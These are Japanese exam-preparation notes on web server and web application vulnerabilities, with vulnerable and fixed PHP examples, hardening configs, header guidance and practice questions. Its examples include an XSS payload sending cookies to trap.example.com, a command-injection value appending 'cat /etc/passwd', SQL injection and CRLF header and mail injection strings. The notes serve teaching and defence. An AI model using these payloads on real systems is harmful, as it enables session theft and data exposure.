> TRACEメソッドを悪用した上記の攻撃手法は、**クロスサイトトレーシング**と呼ばれます。TRACEはリクエストをそのまま返すので、HttpOnly属性でスクリプトから読めないはずのCookieも、レスポンス本文の中に現れてしまうというのが攻撃の要点でした。ただし、現在普及している主要なWebブラウザでは、いずれもTRACEメソッドを `XMLHttpRequest` などのスクリプトから発行することを禁止しているため、XSTが発生する可能性は低くなっています。それでも使わないメソッドは無効化するのが原則です。

### 4.2 Webサーバの実装や設定の不備による脆弱性への対策

Webサーバの運用者は、次の対策を講じます。

| 対策 | 防ぐ脆弱性 | 何のために |
|---|---|---|
| Webサーバプログラムのバージョンを最新化し、パッチを適用する | ④ | 既知のBOFなどの脆弱性を突かせない |
| 不要な機能やコマンド（PUT、TRACEなどのメソッドを含む）を無効にするか、使用可能な範囲を制限する | ⑤ | 改ざんや管理情報の閲覧の入口をなくす |
| ディレクトリのアクセス権を適切に設定する | ① | 公開すべきでないファイルを読ませない |
| すべてのディレクトリにデフォルトページを置く | ① | ファイル一覧を表示させない |
| ディレクトリ参照を禁止する（デフォルトページを置かない場合） | ① | 同上 |
| クライアントに詳細なエラーメッセージを送らないよう設定する | ② | 攻撃の手掛かりを与えない |
| HTTPヘッダにWebサーバプログラムの詳細情報を含めないよう設定する | ③④ | 狙うべき脆弱性を特定させない |
| IPSなどを用いて、既知の攻撃パターンを検知・遮断する | ①④ | パッチ適用までの間も攻撃を止める |

**IPS**（Intrusion Prevention System：侵入防止システム）は、ネットワークを流れるパケットを監視し、不正アクセスや攻撃と判断した通信を検知するとともに、自動的に遮断する機能をもつシステムです（第5章 5.7）。

Apache HTTP Server の場合、設定の見た目は次のようになります（nginx なら `server_tokens off;`、`autoindex off;` などが相当します）。

```apache
ServerTokens Prod                 # Server ヘッダを "Apache" だけにする（③）
ServerSignature Off               # エラーページ下部のバージョン表示を消す（③）
TraceEnable Off                   # TRACE メソッドを無効にする（⑤）
Header always unset X-Powered-By  # 実行環境の版を出さない（③）

<Directory "/var/www/html">
    Options -Indexes              # ディレクトリ参照を禁止する（①）
    <LimitExcept GET POST HEAD>
        Require all denied        # GET・POST・HEAD 以外のメソッドを拒否する（⑤）
    </LimitExcept>
</Directory>

<Location "/server-status">
    Require ip 192.0.2.0/24       # 管理用の機能は管理セグメントからだけ許可する（⑤）
</Location>

ErrorDocument 500 /error/500.html # 詳細を含まない独自のエラーページを返す（②）
```

あわせて、アプリケーション側でも `display_errors = Off`（PHPの場合）のように、エラーの詳細を画面ではなくサーバ側のログにだけ出す設定にします。エラーの詳細は、運用者が原因を調べるためにはログに必要ですが、攻撃者に見せる必要はないからです。

## 5. Webアプリケーションの仕様や実装による脆弱性と対策

### 5.1 Webアプリケーションの仕様や実装による脆弱性

セッション管理に関する脆弱性以外で、Webアプリケーションの仕様や実装による脆弱性を次に示します。攻撃の手口は 2.8 で詳しく見たので、ここでは「どんな実装が原因になるか」と「結果として何が起きるか」に絞って確認します。5つに共通する根本原因は、**利用者が入力したデータ**が、HTML・SQL文・OSコマンド・HTTPヘッダ・メールヘッダという**別の言語の中に、区切りを意識せずにそのまま埋め込まれる**ことです。その結果、データのつもりだった文字列が「命令」として解釈されてしまいます。

| 脆弱性 | データが埋め込まれる先 | 命令として働く文字の例 | 2.8 の節 |
|---|---|---|---|
| ① XSS | HTML・JavaScript | `<` `>` `"` `'` `&` | 2.8.2 |
| ② SQLインジェクション | SQL文 | `'` `--` `;` | 2.8.3 |
| ③ OSコマンドインジェクション | OSコマンド（シェル） | `;` `\|` `&` `` ` `` `$()` | 2.8.4 |
| ④ HTTPヘッダインジェクション | HTTPレスポンスヘッダ | 改行コード（CR `%0d`、LF `%0a`） | 2.8.5 |
| ⑤ メールヘッダインジェクション | メールヘッダ | 改行コード（CR `%0d`、LF `%0a`） | 2.8.6 |

**① XSSの脆弱性により、クライアント環境で悪意あるスクリプトが実行されてしまう可能性がある**

XSSは、ユーザの入力内容をそのままWebページに出力するWebアプリケーションの脆弱性を突き、悪意あるスクリプトを埋め込んで利用者のWebブラウザ上で実行させる攻撃手法です。

- Cookieの不正取得に限らず、クライアント環境でデータの改ざんや破壊などが行われる可能性がある。
- 動的に生成されてクライアント環境に送られるWebコンテンツに、不正な入力フィールドを挿入されることなどにより、フィッシング詐欺に悪用される可能性がある（正規サイトの画面上に偽のログインフォームを表示させる、など）。

**② SQLインジェクションの脆弱性により、データベース上のデータが不正に取得・改ざんされたり、データベースが破壊されたりする可能性がある**

ユーザの入力データを基にSQL文を編集してデータベースにアクセスする仕組みになっているWebページにおいて、入力データのチェックが適切に行われていないと、不正なSQL処理が実行される可能性があります。SQLインジェクションは、ユーザの入力データを基にSQL文を組み立ててデータベース（DB）にアクセスするWebアプリケーションに対し、不正なSQL文の断片を入力することで、データベースの不正な参照、データの改ざんや削除などを行う攻撃手法です。

**③ OSコマンドインジェクションの脆弱性により、Webサーバ上で任意のファイルの読出し、変更、削除、パスワードの不正取得などが行われる可能性がある**

ユーザの入力データを基に、OSのコマンドを呼び出して処理するWebページにおいて、入力データのチェックが適切に行われていないと、不正なコマンドが実行される可能性があります。OSコマンドインジェクションは、ユーザの入力データを基にOSのコマンドを呼び出して処理するWebアプリケーションに対し、不正な入力を行うことで、Webサーバ上で任意のファイルの読出し、変更、削除、パスワードの不正取得などを行う攻撃手法です。

**④ HTTPヘッダインジェクションの脆弱性により、クライアントに不正なCookieがセットされたり、偽のコンテンツが表示されたりする可能性がある**

ユーザの入力データを基にHTTPレスポンスヘッダ（`Location` ヘッダや `Set-Cookie` ヘッダなど）を出力するWebページにおいて、改行コードを混入することで、任意のレスポンスヘッダやレスポンスボディを追加され、不正なCookieの設定やキャッシュの汚染、偽のWebページの表示などが行われる可能性があります。

**⑤ メールヘッダインジェクションの脆弱性により、不正なメールが送信される可能性がある**

ユーザの入力データを基にメールを送信するWebページ（問合せフォームなど）において、改行コードを混入することで任意のメールヘッダ（`To`、`Cc`、`Bcc` など）を追加し、意図していないアドレスに迷惑メール等が送信される可能性があります。組織の正規のメールサーバから送られるため、受信側では迷惑メールと判別されにくく、組織の信用も損なわれます。

### 5.2 Webアプリケーションの仕様や実装による脆弱性への対策

Webアプリケーションの開発者とDBサーバの管理者は、次の対策を講じます。

- WebアプリケーションからDBサーバへのリクエストの処理には、**バインド機構**（**プレースホルダ**）を優先的に用いる（SQLインジェクション対策）
- ユーザの入力データを処理するWebアプリケーションにおいて、入力データ中にスクリプトやコマンドとして意味をもつ文字が存在した場合には、HTMLを生成する際、もしくはコマンドを発行する直前に、それらに対する**エスケープ処理**を行う
- DBサーバ（RDBMS）の設定により、WebアプリケーションからDBに対するクエリを、必要最小限の権限のみをもつアカウントで処理するようにする（SQLインジェクション対策）
- Webアプリケーションの中で、OSコマンドの呼出しが可能な関数を極力使用しないようにする（OSコマンドインジェクション対策）
- HTTPレスポンスヘッダやメールヘッダを出力する際には、入力データに含まれる改行コードを除去する、または専用のAPIを使用する（HTTPヘッダインジェクション／メールヘッダインジェクション対策）
- **Webアプリケーションファイアウォール（WAF）**を用いて、Webアプリケーションの脆弱性を突いた攻撃を遮断する

ここで大切なのは、エスケープを「入力を受け取ったとき」ではなく「**出力する直前**」に、「**出力先の言語に合わせて**」行うことです。同じ文字列でも、HTMLに出すなら `<` を `&lt;` に、SQLに渡すならプレースホルダで、シェルに渡すならシェル用の引用で扱う必要があり、入力時に一律に処理しても出力先ごとの対策にはならないからです（本ノート 2.3 の対策表で「入力データに含まれるメタキャラクタのエスケープ」と書いたのも、実装上は出力時のエスケープを指します）。以下、脆弱な実装と安全な実装を並べて確認します（PHPの例）。

**SQLインジェクション対策 ― プレースホルダ**

```php
// 脆弱な実装：入力値を文字列連結でSQL文に埋め込んでいる
$sql = "SELECT * FROM users WHERE login_id = '" . $_POST['id'] . "' AND pass_hash = '" . $hash . "'";
$rows = $pdo->query($sql);
// id に  ' OR 1=1 --   を入力されると、SQL文は次のようになり、パスワード照合が無効化される
//   SELECT * FROM users WHERE login_id = '' OR 1=1 --' AND pass_hash = '...'

// 安全な実装：プレースホルダ（?）でSQL文の構造を先に確定させ、値は後から割り当てる
$stmt = $pdo->prepare("SELECT * FROM users WHERE login_id = ? AND pass_hash = ?");
$stmt->execute([$_POST['id'], $hash]);
// ' OR 1=1 -- は「そういう文字列のログインID」として扱われ、SQLの構文にはならない
```

**バインド機構**とは、SQL文の中で変数部分をプレースホルダ（`?` などの記号）で表しておき、後から実際の値を割り当てる仕組みです。入力値はSQL文の構造とは切り離されたデータとして扱われるため、SQLインジェクションを根本的に防ぐことができます。エスケープ処理でも防げますが、エスケープ漏れが1か所でもあれば破られるため、開発者はプレースホルダを優先的に使うべきです。

**被害を小さくする ― DBアカウントの最小権限**

DBサーバの管理者は、プレースホルダの漏れがあった場合の被害を限定するために、Webアプリケーション用のDBアカウントに、業務に必要な権限だけを与えます（1.2 で学んだ最小権限の原則）。

```sql
-- 管理者権限（ALL PRIVILEGES）ではなく、必要な表への必要な操作だけを許可する
CREATE USER 'webapp'@'192.0.2.20' IDENTIFIED BY '（強固なパスワード）';
GRANT SELECT ON shop.items TO 'webapp'@'192.0.2.20';
GRANT SELECT, INSERT ON shop.orders TO 'webapp'@'192.0.2.20';
-- DROP・DELETE の権限や、会員の決済情報の表への権限は与えない
```

**XSS対策 ― 出力時のエスケープ**

```php
// 脆弱な実装：入力値をそのままHTMLに出力している
echo '<p>検索キーワード：' . $_GET['q'] . '</p>';
// q に  <script>location.href='https://trap.example.com/?c='+document.cookie</script>
// を入れたURLを踏まされると、利用者のブラウザでスクリプトが実行される

// 安全な実装：HTMLに出力する直前に、HTMLで意味をもつ文字を文字参照に置き換える
echo '<p>検索キーワード：' . htmlspecialchars($_GET['q'], ENT_QUOTES, 'UTF-8') . '</p>';
// 画面には  &lt;script&gt;...  として届き、ブラウザは文字として表示するだけになる
```

| 元の文字 | 置き換え後 | 置き換える理由 |
|---|---|---|
| `&` | `&amp;` | 文字参照の開始として解釈されないようにする |
| `<` | `&lt;` | タグの開始として解釈されないようにする |
| `>` | `&gt;` | タグの終了として解釈されないようにする |
| `"` | `&quot;` | 属性値の区切りとして解釈されないようにする |
| `'` | `&#039;` | 属性値の区切りとして解釈されないようにする |

エスケープに加えて、Cookieには HttpOnly 属性を付け（本ノート 2.3）、レスポンスヘッダの **Content-Security-Policy**（CSP）で実行してよいスクリプトの読込み元を限定しておくと、エスケープ漏れがあっても被害を抑えられます（多層防御。本ノート 5.3）。なお、URLを出力する箇所では、`javascript:` で始まる値を拒否し、`http://` か `https://` で始まるものだけを許可する必要があります。エスケープしても `href="javascript:..."` はスクリプトとして動くからです。

**OSコマンドインジェクション対策 ― シェルを呼ばない**

```php
// 脆弱な実装：入力値をシェルのコマンド文字列に連結している
system('ping -c 1 ' . $_GET['host']);
// host に  192.0.2.1; cat /etc/passwd  を入れられると、ping のあとに cat が実行される

// 安全な実装1：OSコマンドを呼ばず、言語の機能（ライブラリ関数）で同じ処理を行う
$ip = gethostbyname($_GET['host']);

// 安全な実装2：どうしても呼ぶ場合は、形式をチェックしたうえで引数として引用する
if (!filter_var($_GET['host'], FILTER_VALIDATE_IP)) { exit('不正な入力です'); }
system('ping -c 1 ' . escapeshellarg($_GET['host']));
```

**HTTPヘッダインジェクション対策 ― 改行コードを除去する・専用のAPIを使う**

```
（攻撃者が利用者に踏ませるURL）
https://www.example.jp/redirect?url=https://www.example.jp/%0d%0aSet-Cookie:%20SESSID=ATTACKER123

（脆弱な実装が返すレスポンス：改行によってヘッダが1行増えている）
HTTP/1.1 302 Found
Location: https://www.example.jp/
Set-Cookie: SESSID=ATTACKER123            ← 攻撃者が決めたセッションIDを押し付けられる（セッションフィクセーション）
```

開発者は、リダイレクト先やCookieの値を出力するときに、入力値からCR・LFを除去するか、改行を含む値を拒否する専用のAPI（PHPの `header()` や `setcookie()` など、現在の多くの言語・フレームワークのヘッダ出力関数は改行を含む値を拒否します）を使うべきです。あわせて、リダイレクト先は自サイト内のパスに限定し、外部のURLへ自由に転送できる状態（オープンリダイレクト）を作らないようにします。

**メールヘッダインジェクション対策 ― 改行コードを除去する・宛先を固定する**

```
（問合せフォームの「メールアドレス」欄に入力された値）
user@example.jp%0d%0aBcc:%20victim1@example.com,victim2@example.com

（脆弱な実装が組み立てるメールヘッダ）
To: support@example.jp
From: user@example.jp
Bcc: victim1@example.com,victim2@example.com  ← 追加された宛先に迷惑メールが送られる
```

開発者は、メールヘッダに入力値を入れる前に改行コードを除去するか、ヘッダを個別に安全に設定できるメール送信ライブラリを使うべきです。さらに、宛先（To）はプログラム内に固定し、利用者の入力で宛先を変えられない設計にするのが確実です。

**WAF**（Web Application Firewall）は、HTTP/HTTPS通信の内容を検査し、SQLインジェクションやXSSなど、Webアプリケーションの脆弱性を突いた攻撃を検知・遮断するファイアウォールです。ただし、本ノート 2.3 の「WAFの限界」で見たとおり、WAFはアプリケーションの改修の代わりにはなりません。WAFの運用者は、脆弱性が見つかってから改修が終わるまでの間の暫定対策や、未知の脆弱性に対する多層防御の一層として位置づけるべきです（第5章 5.8）。

### 5.3 安全なレスポンスの全体像 ― ヘッダによる多層防御

ここまでの対策のうち、HTTPレスポンスヘッダで実現するものをまとめると、安全に設定されたWebサイトのログイン後のページは、次のようなレスポンスを返します（各ヘッダの意味は 1.4 の 7.4、7.7。右側の括弧内は本ノートの節番号です）。

```
HTTP/1.1 200 OK
Server: Apache                                                  ← 版を出さない（4.2）
Content-Type: text/html; charset=UTF-8                          ← 文字コードを明示する（文字コードの誤認識によるXSSを防ぐ）
Strict-Transport-Security: max-age=31536000; includeSubDomains  ← 以後1年間はHTTPSでしか接続させない（2.3・3.2）
Content-Security-Policy: default-src 'self'; script-src 'self'; frame-ancestors 'none'
                                                                ← 自サイト以外のスクリプトを実行させない・他サイトの枠に表示させない
X-Content-Type-Options: nosniff                                 ← Content-Type の推測をさせない
X-Frame-Options: DENY                                           ← 古いブラウザ向けのクリックジャッキング対策
Referrer-Policy: strict-origin-when-cross-origin                ← 外部サイトへはURLのパスやパラメータを送らない（2.2 の④）
Cache-Control: no-store                                         ← 個人情報を含むページをキャッシュに残さない（2.3）
Set-Cookie: SESSID=f3Kq9vX2mL7pR0tZ8wB4nC6yD1sH5jA; Path=/; Secure; HttpOnly; SameSite=Lax
                                                                ← 2.3 の Cookie の対策をすべて反映
```

これらのヘッダは、どれも「アプリケーションの実装に漏れがあったときに、ブラウザ側でもう一段止める」ためのものです。開発者と運用者は、ヘッダを付けたことを理由にエスケープやプレースホルダを省略してはいけません。

## 6. 主なプロトコルの脆弱性と対策（第3章のまとめ）

3.3〜3.6 で扱った、主なプロトコルの脆弱性と対策を一覧にまとめます。どのプロトコルにも共通するのは、「認証がない（弱い）」「平文で流れる」という2種類の脆弱性があり、前者には認証の追加、後者にはTLSやSSHによる暗号化で対処する、という構図です。

| プロトコル | 脆弱性 | 想定されるリスク | 対策 |
|---|---|---|---|
| SMTP | メール送信にあたってユーザを認証する仕組みがない | スパムの踏み台になる | ・SMTP-AUTH を使用<br>・POP before SMTP を使用<br>・送信元アドレス（ドメイン名）に対するチェック<br>・投稿用ポート（Submission：587/TCP）で SMTP-AUTH を使用し、投稿と配送を分離<br>・SMTP over TLS（SMTPS：465/TCP（※）） |
| SMTP | 送信データ（メール）が平文でネットワークを流れる | パケット盗聴による情報漏えい | ・Submission over TLS（587/TCP）<br>・SMTP over TLS（SMTPS：465/TCP（※））<br>・メール暗号化ツール（PGP、S/MIME） |
| POP3 | 認証情報が平文でネットワークを流れる | パケット盗聴による認証情報の漏えい | ・APOP を使用（認証情報の秘匿化。下の注を参照） |

| HTTP | ベーシック認証において、ほぼ平文（BASE64 エンコード）で認証情報がネットワークを流れる | パケット盗聴による認証情報の漏えい | ・フォームを用いた認証＋TLS（HTTPS）を使用<br>・ダイジェスト認証を使用（教科書では「HTTP/1.1 でのみ使用可能」と表現される。正確には HTTP/1.1 の時代に RFC 2617 で標準化された方式で、現行仕様は RFC 7616） |

> **APOPについての注意**
> 以前は、APOPは「認証情報の暗号化」の手段と説明されることがありました。正確には、APOPは暗号化ではなく、サーバが送るチャレンジとパスワードからMD5のハッシュ値を計算して送るチャレンジレスポンス方式で、パスワードそのものを流さないことで秘匿化するものです（3.4 で解説）。さらに2007年に、MD5の弱さを利用してAPOPのパスワードを解読できる手法が報告されたため、現在はAPOPに頼らず、POP3S・IMAPSなどTLSで通信全体を暗号化する方法を使うべきとされています。

> **DNSのゾーン転送のフィルタリングについて**
> 表中の「フィルタリングする」は、53/TCPを一律に遮断する意味ではありません。3.5 で見たとおり、現在は通常の名前解決でもTCPを使うため、DNSサーバの設定でゾーン転送の許可先を限定するのが基本です。

> **DNSキャッシュポイズニング**
> キャッシュDNSサーバに偽の応答を送り込み、不正な名前解決情報をキャッシュさせる攻撃。利用者を偽のWebサイトへ誘導する目的で悪用される。対策として、問合せ時の送信元ポート番号のランダム化や、応答にディジタル署名を付与するDNSSECの導入などがある（詳細は 3.5）。

## 7. 確認問題

### 7.1 理解度チェック

- [x] **Q1**：セッション管理に関する脆弱性にはどのようなものがあるか。
- [x] **Q2**：セキュリティを考慮したセッション管理とはどのようなものか。
- [x] **Q3**：CSRFによってどのような問題が発生し、どのような対策があるのか。
- [x] **Q4**：HTTPのプロトコルの仕様にはどのような脆弱性があるか。
- [ ] **Q5**：Webサーバの実装や設定の不備による脆弱性にはどのようなものがあるか。
- [ ] **Q6**：Webサーバに対する不正アクセスを防ぐためにはどのような対策が有効か。
- [x] **Q7**：Webアプリケーションの仕様や実装による脆弱性にはどのようなものがあるか。
- [x] **Q8**：Webアプリケーションによる情報漏えいとしてどのようなケースが想定されるか。

> **解答例**
> - **Q1**：HTTP通信の盗聴によるセッション管理情報の窃取、推測しやすいセッションIDの推測・改ざん、詳細なセッション管理情報のやり取りによる漏えい、Refererによる外部サイトへの漏えい、hiddenフィールドの改ざん、XSSによるCookieの窃取、Cookieの属性設定（Secure・有効期限・Domain／Path）の不備、URL Rewriting機能によるセッションフィクセーション、セッション管理のバグによる認証の回避、の9つ。
> - **Q2**：通信をHTTPSで暗号化し、セッション管理情報はIDだけにして、十分な長さの推測困難な乱数を使う。IDはCookieで受け渡し、Secure・HttpOnly・SameSite属性を付け、有効期限を短く有効範囲を狭くする。URL Rewriting機能を無効にし、ログイン成功時にセッションIDを再発行する。hiddenフィールドの値はサーバ側で検証し、認証が必要なすべてのページでセッションを確認する。
> - **Q3**：ログイン中の利用者が罠のページを開くと、意図しない注文、パスワードの変更、退会、書き込みなどの処理をWebアプリケーションに要求させられる。対策は、SameSite属性（Strict／Lax）、確認画面で発行したCSRFトークンの照合、確定直前のパスワード再入力、Refererの確認、重要な操作後の通知メール（被害に気づかせる）。
> - **Q4**：通信データが平文で流れるため盗聴・改ざんされる。ベーシック認証では認証情報がBASE64でほぼ平文のまま毎回送られるため、盗聴で容易に盗まれる。また、Webサーバごとに認証情報を管理するため一元管理できず、漏えいの危険性が高まる。
> - **Q5**：ディレクトリのアクセス権やディレクトリ参照の設定不備（ディレクトリトラバーサル、機密ファイルの閲覧）、詳細なエラーメッセージの出力、Serverヘッダなどによるバージョン情報の露出、特定バージョンのBOFの脆弱性、PUT・TRACEなどのメソッドや管理者用コマンドの設定不備。
> - **Q6**：Webサーバプログラムを最新化してパッチを適用する、不要なメソッドやコマンドを無効化する、ディレクトリのアクセス権を適切にし、デフォルトページを置くかディレクトリ参照を禁止する、詳細なエラーメッセージとバージョン情報を出さない、IPSで既知の攻撃パターンを遮断する。
> - **Q7**：XSS、SQLインジェクション、OSコマンドインジェクション、HTTPヘッダインジェクション、メールヘッダインジェクション。いずれも入力データが別の言語（HTML、SQL、シェル、ヘッダ）の中に区切りなく埋め込まれることが原因である。
> - **Q8**：SQLインジェクションによるDB内の個人情報の窃取、OSコマンドインジェクションやディレクトリトラバーサルによるサーバ上のファイル（パスワードファイルなど）の読出し、XSSによるCookie（セッションID）の窃取や偽の入力フォームによるフィッシング、セッションIDの推測・Refererからの漏えいによる他人の情報の閲覧、ディレクトリ参照や詳細なエラーメッセージからの情報漏えい。

### 7.2 演習問題（過去問題）

クロスサイトリクエストフォージェリ攻撃の対策として、効果がないものはどれか。

- **ア**　Webサイトでの決済などの重要な操作の都度、利用者のパスワードを入力させる。
- **イ**　Webサイトへのログイン後、毎回異なる値をHTTPレスポンスボディに含め、Webブラウザからのリクエストごとに送付されるその値を、Webサーバ側で照合する。
- **ウ**　Webブラウザからのリクエスト中のRefererによって、正しいリンク元からの遷移であることを確認する。
- **エ**　Webブラウザからのリクエストを Webサーバで受け付けた際に、リクエストに含まれる「`<`」、「`>`」などの特殊文字を、「`&lt;`」、「`&gt;`」などの文字列に置き換える。

*〔情報処理安全確保支援士試験・R6春〕*

> **解答・解説**
> クロスサイトリクエストフォージェリ（Cross-Site Request Forgeries：CSRF）攻撃とは、Webアプリケーションのユーザ認証やセッション管理の不備を突いて、サイトの利用者に、Webアプリケーションに対する不正な処理要求を行わせる手法である。CSRFによる被害を防ぐためには、Webアプリケーション側が認証機能やセッション管理機能を強化し、不正なリクエストを受け付けないようにする必要がある。具体的な対策には、次のようなものがある。
>
> - Webサイトへのログイン後、HTTPレスポンスに毎回異なる値（トークン）を含め、その値をWebサーバ側で照合する（イ）
> - 重要な操作の直前で再度パスワードを入力させる（ア）
> - リクエスト中の Referer を確認し、正しいリンク元からの遷移であることを確認する（ウ）
>
> 一方、エの特殊文字のエスケープ処理は、クロスサイトスクリプティング（XSS）の対策である。CSRFでは、攻撃者が用意した罠サイトなどを経由して、利用者のWebブラウザから正規の形式のリクエストが送信されるため、特殊文字を置き換えても不正なリクエストを防ぐことはできない。
>
> **解答：エ**

本ノート 2.4 の「CSRFとXSSの違い」の表がそのまま解答の根拠になります。「CSRFのリクエストは中身が正規の形式なので、文字列を無害化する対策は効かない」と1文で言えるようにしておきましょう。

## 8. 試験対策まとめ（重要ポイント）

### 8.1 知識の確認（科目A-2向け）

- **4分類と対処**：セッション管理とWebアプリケーションの実装は固有の脆弱性なので本番運用前の脆弱性診断で見つけて改修、Webサーバ製品の脆弱性はパッチ、設定不備は診断で発見して修正、HTTPの仕様はHTTPSと認証方式で対処。
- **セッションIDの受渡し**：クエリストリングはアクセスログ・Referer・履歴から漏えい。Cookieが標準。hiddenフィールドは改ざんされる前提で必ずサーバ側で検証。
- **Cookieの属性**：Secure＝盗聴対策（HTTPSのみ送る）、HttpOnly＝XSS対策（スクリプトから読ませない）、SameSite（Strict／Lax）＝CSRF対策。Domainは指定しないほうが送信先が狭い。有効期限は短く。
- **セッションフィクセーション**：攻撃者が既知のセッションIDでログインさせる。対策はログイン成功時のセッションID再発行とURL Rewriting機能の無効化。
- **CSRF対策とXSS対策の識別**：CSRF＝トークン、再認証、Referer確認、SameSite。特殊文字のエスケープはXSS対策でありCSRFには効かない（R6春）。通知メールは防止ではなく検知。
- **ベーシック認証**：BASE64は暗号化ではなく容易にデコードできる。毎回送出される。ダイジェスト認証はnonceとMD5のチャレンジレスポンスでパスワードを流さないが、MD5は弱く通信は暗号化されない。
- **Webサーバの設定**：ディレクトリ参照の禁止・デフォルトページ、詳細なエラーメッセージを返さない、Serverヘッダの版を隠す、PUT・TRACE・管理コマンドの無効化。XSTはTRACEの悪用だが、現在はブラウザ側で発生しにくい。
- **SQLインジェクション**：プレースホルダ（バインド機構）が根本対策。DBアカウントの最小権限は被害の限定。
- **エスケープのタイミング**：出力する直前に、出力先の言語に合わせて行う。`&` `<` `>` `"` `'` の文字参照への置換。
- **ヘッダ・メールのインジェクション**：原因は改行コード（CR・LF）の混入。対策は改行の除去か専用のAPI。
- **WAF**：パターン化しやすい攻撃には有効だが、セッション管理やロジックの不備は防げない。改修の代わりにはならない。
- **プロトコル一覧**：HTTPS 443、SMTPS 465、Submission 587、POP3S 995、IMAPS 993、FTPS 989／990、TELNETS 992。APOPは暗号化ではなくMD5のチャレンジレスポンスで、現在はTLSを使う。

### 8.2 記述式で問われる観点（科目B向け）

- **ソースコードから脆弱性を特定する**：文字列連結で組み立てたSQL文、エスケープせずに出力している箇所、`system()` などシェルを呼ぶ関数、入力値をそのまま入れた `Location`／`Set-Cookie`／メールヘッダを見つけ、脆弱性の名称と修正方法（プレースホルダ、出力時のエスケープ、シェルを呼ばない、改行の除去）を書けるようにする。
- **対策を「誰が・何を・何のために・どうする」で書く**：例「開発者は、攻撃者が事前に用意したセッションIDでログインさせるセッションフィクセーションを防ぐために、ログイン成功時にセッションIDを再発行し、古いIDを無効化する」。
- **HTTPヘッダ・Set-Cookieを読む**：事例のレスポンスから、Secure・HttpOnly・SameSite の欠落、長すぎる有効期限、広すぎるDomain、Serverヘッダの版の露出を指摘し、それぞれがどの攻撃につながるかを説明する。
- **CSRF対策の選択と理由**：「確認画面で発行したトークンをサーバ側で照合する。攻撃者は利用者のセッションに対応するトークンを知り得ないため、罠ページから正しいリクエストを作れない」のように、効く理由まで書く。
- **ログから攻撃と成否を判断する**：アクセスログの `../`、`%2e%2e%2f`、`' OR 1=1`、`<script>` などの文字列から攻撃の種類を特定し、ステータスコードとレスポンスサイズから成功した可能性を判断する。POSTの入力はアクセスログに残らないため、アプリケーション側のログが必要になることも指摘できるようにする。
- **WAFと改修の関係**：「WAFは改修までの暫定対策・多層防御の一層であり、根本対策はアプリケーションの改修である」「セッション管理やアクセス制御の不備はWAFでは防げない」を理由とともに述べる。
- **発注者・運用者の観点**：外部委託で開発する場合は、脆弱性診断の実施と改修を契約・受入れ条件に含めること、運用開始後もミドルウェアの脆弱性情報を継続的に確認してパッチを適用することを、管理策として提案できるようにする。
